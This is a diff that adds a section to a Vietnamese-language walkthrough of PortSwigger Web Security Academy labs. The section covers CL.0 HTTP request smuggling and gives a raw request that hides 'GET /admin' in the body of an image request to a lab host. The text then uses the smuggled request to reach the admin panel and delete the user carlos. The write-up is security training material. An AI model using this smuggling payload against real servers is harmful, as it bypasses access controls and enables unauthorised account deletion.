@@ -557,6 +557,20 @@ Kết quả, ta thu được:
 
 Thay thế session cookie hiện tại bằng session cookie thu được, sau đó vào admin panel xóa user carlos. Kết quả thành công.
 # 15. CL.0 request smuggling
+Cấu hình request sau:
+```
+GET /image/blog/posts/18.jpg HTTP/1.1
+Host: 0a86009f047d6207c087bd7400310014.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+xxGET /admin HTTP/1.1
+Foo: x
+```
+Sau khi submit hai lần, ta nhận được response `Backend only accepts methods GET, POST, HEAD`. Như vậy, với các resources là images, website có lỗ hổng CL.0.
+
+Thay đổi smuggled request thành `GET /admin`, ta có thể truy cập admin panel. Sau đó đặt smuggled request là `GET /admin/delete?username=carlos`, kết quả bài lab được giải thành công.
 
 # 16. Exploiting HTTP request smuggling to perform web cache poisoning
 
